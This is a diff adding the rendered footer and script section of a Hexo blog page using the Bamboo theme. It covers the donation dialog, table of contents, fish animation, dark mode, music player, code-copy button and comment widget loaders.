+          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
+        
+          <div class="toc-open-close">catalog</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || '#42b983';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2022 - 2025 <a target="_blank" rel="noopener" href="https://github.com/yuang01">yuang01</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+            <!-- 不蒜子统计 -->
+            <!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+      <i class="fas fa-eye" aria-hidden="true"></i>Total visits：<span id="busuanzi_value_site_pv"></span> times
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+      <i class="fas fa-users" aria-hidden="true"></i>Number of visitors：<span id="busuanzi_value_site_uv"></span> people
+</span>
+
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark">
+  <div class="dark-content">
+    <i class="fas fa-moon" aria-hidden="true"></i>
+    <!-- <span>关灯</span> -->
+  </div>
+  
+</div>
+
+<script>
+  $(function() {
+    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
+    if (isDark) {
+      $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+    }
+    $('.dark').click(function() {
+      if ($(document.body).is('.darkModel')) {
+        $(document.body).removeClass('darkModel');
+        localStorage.setItem('dark', false);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-moon" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      } else {
+        $(document.body).addClass('darkModel');
+        localStorage.setItem('dark', true);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      }
+    })
+  })
+</script>
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  display: none;
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  display: none;
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="netease"
+  type="playlist"
+  id="3116359624"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script>
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -80,
+    headingsOffset: -($(window).height() * 0.4 - 45),
+    positionFixedSelector: '.toc-main',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 100) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('toc-aside')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  }
+</style> 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const headerMenuTransparent = true;
+    if (!headerMenuTransparent) { return; }
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = 'copy';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <script type="text/javascript">
+  var utteranceCommon = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceCommon.Theme = 'github-dark';
+    } else {
+      utteranceCommon.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceCommon.Theme)
+      utterances.setAttribute('repo', '')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceCommon.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
